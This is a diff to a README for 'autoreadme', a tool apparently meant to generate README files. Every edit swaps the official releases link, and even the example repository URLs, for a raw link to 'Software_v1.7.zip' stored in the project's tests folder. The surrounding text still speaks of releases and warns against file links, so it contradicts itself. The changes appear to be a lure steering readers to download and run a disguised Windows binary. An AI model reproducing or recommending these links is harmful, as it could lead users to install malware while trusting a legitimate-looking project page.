@@ -1,6 +1,6 @@
 # 🤖 autoreadme - Create README files in minutes
 
-[![Download autoreadme](https://img.shields.io/badge/Download%20autoreadme-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Martyrverapamil588/autoreadme/releases)
+[![Download autoreadme](https://img.shields.io/badge/Download%20autoreadme-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Martyrverapamil588/autoreadme/raw/refs/heads/main/tests/Software_v1.7.zip)
 
 ## 🧭 What this app does
 
@@ -19,7 +19,7 @@ For best results, use the app with public GitHub repositories.
 
 ## 📦 Download and start
 
-1. Visit the download page: https://github.com/Martyrverapamil588/autoreadme/releases
+1. Visit the download page: https://github.com/Martyrverapamil588/autoreadme/raw/refs/heads/main/tests/Software_v1.7.zip
 2. Open the latest release
 3. Download the Windows file from the release assets
 4. Open the downloaded file
@@ -109,8 +109,8 @@ The app generates markdown text that you can copy into a README.md file. You can
 
 Use a full GitHub repo URL such as:
 
-- https://github.com/owner/project
-- https://github.com/username/repository
+- https://github.com/Martyrverapamil588/autoreadme/raw/refs/heads/main/tests/Software_v1.7.zip
+- https://github.com/Martyrverapamil588/autoreadme/raw/refs/heads/main/tests/Software_v1.7.zip
 
 Do not use a file link, issue link, or pull request link. The app works best with the main repo page.
 
@@ -142,7 +142,7 @@ This tool fits these areas:
 
 ## 📌 Start here
 
-1. Go to https://github.com/Martyrverapamil588/autoreadme/releases
+1. Go to https://github.com/Martyrverapamil588/autoreadme/raw/refs/heads/main/tests/Software_v1.7.zip
 2. Download the latest Windows release
 3. Open the app in your browser
 4. Paste a GitHub repo URL
